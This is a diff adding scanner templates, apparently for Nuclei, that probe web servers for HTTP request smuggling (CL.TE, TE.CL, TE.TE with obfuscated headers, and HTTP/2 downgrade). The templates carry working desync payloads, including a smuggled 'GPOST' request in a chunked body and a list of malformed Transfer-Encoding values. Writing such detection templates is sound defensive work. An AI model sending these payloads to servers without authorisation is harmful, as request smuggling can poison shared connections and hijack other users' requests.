@@ -1,0 +1,162 @@
+id: http-request-smuggling-cl-te
+
+info:
+  name: HTTP Request Smuggling - CL.TE
+  author: ancarna
+  severity: high
+  description: Detects CL.TE request smuggling where frontend uses Content-Length and backend uses Transfer-Encoding
+  tags: smuggling,http,desync
+  classification:
+    cwe-id: 444
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: "6"
+      Transfer-Encoding: chunked
+    body: |
+      0
+
+      G
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Unrecognized method"
+          - "Method not allowed"
+          - "Invalid request"
+          - "Bad request"
+        case-insensitive: true
+
+      - type: status
+        status:
+          - 400
+          - 403
+          - 405
+
+---
+id: http-request-smuggling-te-cl
+
+info:
+  name: HTTP Request Smuggling - TE.CL
+  author: ancarna
+  severity: high
+  description: Detects TE.CL request smuggling where frontend uses Transfer-Encoding and backend uses Content-Length
+  tags: smuggling,http,desync
+  classification:
+    cwe-id: 444
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: "4"
+      Transfer-Encoding: chunked
+    body: |
+      5c
+      GPOST / HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 15
+
+      x=1
+      0
+
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Unrecognized method GPOST"
+          - "Method GPOST not allowed"
+          - "Unknown method"
+        case-insensitive: true
+
+---
+id: http-request-smuggling-te-te
+
+info:
+  name: HTTP Request Smuggling - TE.TE Obfuscation
+  author: ancarna
+  severity: high
+  description: Detects TE.TE request smuggling using obfuscated Transfer-Encoding headers
+  tags: smuggling,http,desync
+  classification:
+    cwe-id: 444
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: "4"
+      Transfer-Encoding: "{{payload}}"
+    payloads:
+      payload:
+        - "chunked"
+        - " chunked"
+        - "chunked "
+        - "\tchunked"
+        - "chunked\t"
+        - "x]chunked"
+        - "chunked\n"
+        - "xchunked"
+        - "chunkedx"
+    body: |
+      5c
+      GPOST / HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 15
+
+      x=1
+      0
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Unrecognized method"
+          - "Method not allowed"
+        case-insensitive: true
+
+---
+id: http2-request-smuggling
+
+info:
+  name: HTTP/2 Request Smuggling Detection
+  author: ancarna
+  severity: medium
+  description: Detects potential HTTP/2 downgrade request smuggling
+  tags: smuggling,http2,desync
+  classification:
+    cwe-id: 444
+  reference:
+    - https://portswigger.net/research/http2
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: "0"
+      Transfer-Encoding: chunked
+    body: ""
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(to_lower(all_headers), "http/2")'
